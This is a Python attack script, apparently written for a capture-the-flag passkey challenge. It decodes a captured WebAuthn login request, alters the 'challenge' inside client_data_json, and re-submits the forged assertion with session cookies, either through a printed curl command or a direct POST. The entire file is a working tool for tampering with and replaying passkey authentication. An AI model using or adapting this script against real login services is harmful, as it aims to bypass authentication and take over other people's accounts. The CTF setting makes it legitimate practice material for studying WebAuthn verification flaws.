#!/usr/bin/env python3
"""
modify_clientdata.py

Purpose:
  - Decode a captured login POST JSON file that contains a base64url 'client_data_json'.
  - Modify the 'challenge' field (append or replace).
  - Output a new base64url-encoded client_data_json suitable for pasting into Burp (or optionally POST it).

Usage examples (see below):
  - Print modified client_data_json only:
      python3 modify_clientdata.py --capture captured.json --append "_X" --print

  - Print curl command (no POST):
      python3 modify_clientdata.py --capture captured.json --append "_X" --print-curl

  - POST the modified request while preserving cookies:
      python3 modify_clientdata.py --capture captured.json --append "_X" --post --cookie "session=abc; other=val"

Input captured.json format:
{
  "url": "https://passkey.chals.tisc25.ctf.sg/login",
  "username": "testuser",
  "credential_id": "...",
  "authenticator_data": "...",
  "client_data_json": "...",   <-- base64url string
  "signature": "..."
}
"""

import argparse, json, base64, sys, textwrap, requests

def b64u_decode(s):
    # Accept str with or without padding; return bytes
    if not isinstance(s, (bytes,bytearray)):
        s = s.encode()
    s += b'=' * ((4 - len(s) % 4) % 4)
    return base64.urlsafe_b64decode(s)

def b64u_encode(b):
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()

def safe_json_load_bytes(b):
    try:
        return json.loads(b.decode('utf-8')), None
    except UnicodeDecodeError as e:
        return None, ("unicode_error", e)
    except Exception as e:
        return None, ("json_error", e)

def modify_challenge(orig_b64u, new_challenge=None, append=None):
    try:
        raw = b64u_decode(orig_b64u)
    except Exception as e:
        print("[!] Failed to base64url-decode input client_data_json:", e)
        sys.exit(1)

    cd, err = safe_json_load_bytes(raw)
    if cd is None:
        kind, exc = err
        print("[!] Decoding client_data_json failed (not UTF-8 JSON).")
        print("    Decoding result (hex):", raw.hex()[:800])
        print("    Error:", exc)
        print("    -> Make sure you copied the exact base64url string from the captured POST.")
        sys.exit(2)

    old_ch = cd.get("challenge")
    if new_challenge is not None:
        cd["challenge"] = new_challenge
    elif append is not None:
        cd["challenge"] = (old_ch or "") + append
    else:
        print("[!] Nothing to change (provide --append or --challenge)")
        sys.exit(1)

    new_raw = json.dumps(cd, separators=(",", ":" ), ensure_ascii=False).encode('utf-8')
    return cd, b64u_encode(new_raw)

def build_curl(url, username, credential_id, auth_data, client_data_json_b64u, signature, cookie_header=None):
    # produce a curl line safe to copy-paste; we use --data-urlencode style for each field
    cookie_part = f'-H "Cookie: {cookie_header}" ' if cookie_header else ''
    # Escape double quotes inside values if any
    def esc(v):
        return v
    curl = textwrap.dedent(f"""\
    curl -i -X POST "{url}" \\
      -H "Content-Type: application/x-www-form-urlencoded" \\
      {cookie_part}--data-urlencode "username={username}" \\
      --data-urlencode "credential_id={credential_id}" \\
      --data-urlencode "authenticator_data={auth_data}" \\
      --data-urlencode "client_data_json={client_data_json_b64u}" \\
      --data-urlencode "signature={signature}"
    """)
    return curl

def main():
    p = argparse.ArgumentParser(description="Modify client_data_json.challenge and produce a value to paste into Burp.")
    p.add_argument("--capture", required=True, help="path to captured JSON file (see header for format)")
    group = p.add_mutually_exclusive_group(required=True)
    group.add_argument("--append", help="string to append to existing challenge (e.g. _X)")
    group.add_argument("--challenge", help="replace challenge with this exact string")
    p.add_argument("--print", action="store_true", help="print only the new client_data_json value")
    p.add_argument("--print-curl", action="store_true", help="print a curl command using the modified client_data_json")
    p.add_argument("--post", action="store_true", help="POST the modified request to server (requires network)")
    p.add_argument("--cookie", help="Cookie header to include when POSTing or to include in printed curl (e.g. 'session=abc;')", default=None)
    args = p.parse_args()

    with open(args.capture, "r") as f:
        cap = json.load(f)

    orig_cd = cap.get("client_data_json")
    if not orig_cd:
        print("[!] capture file missing client_data_json")
        sys.exit(1)

    cd_json_obj, new_cd_b64u = modify_challenge(orig_cd, new_challenge=args.challenge, append=args.append)

    print("=== Modified client_data_json (base64url) ===")
    print(new_cd_b64u)
    print()
    print("=== Modified client_data_json (decoded pretty) ===")
    print(json.dumps(cd_json_obj, indent=2, ensure_ascii=False))
    print()

    if args.print_curl or args.post:
        curl = build_curl(cap["url"], cap["username"], cap["credential_id"], cap["authenticator_data"], new_cd_b64u, cap["signature"], cookie_header=args.cookie)
        print("=== COPY-PASTE curl command ===")
        print(curl)
        print()

    if args.post:
        headers = {"Content-Type":"application/x-www-form-urlencoded"}
        if args.cookie:
            headers["Cookie"] = args.cookie
        data = {
            "username": cap["username"],
            "credential_id": cap["credential_id"],
            "authenticator_data": cap["authenticator_data"],
            "client_data_json": new_cd_b64u,
            "signature": cap["signature"]
        }
        print("[*] Sending POST to", cap["url"], "with headers:", headers)
        r = requests.post(cap["url"], data=data, headers=headers, allow_redirects=True, timeout=15)
        print("=== HTTP RESPONSE ===")
        print(r.status_code, r.reason)
        print(r.url)
        print(r.headers)
        print(r.text[:2000])

if __name__ == "__main__":
    main()
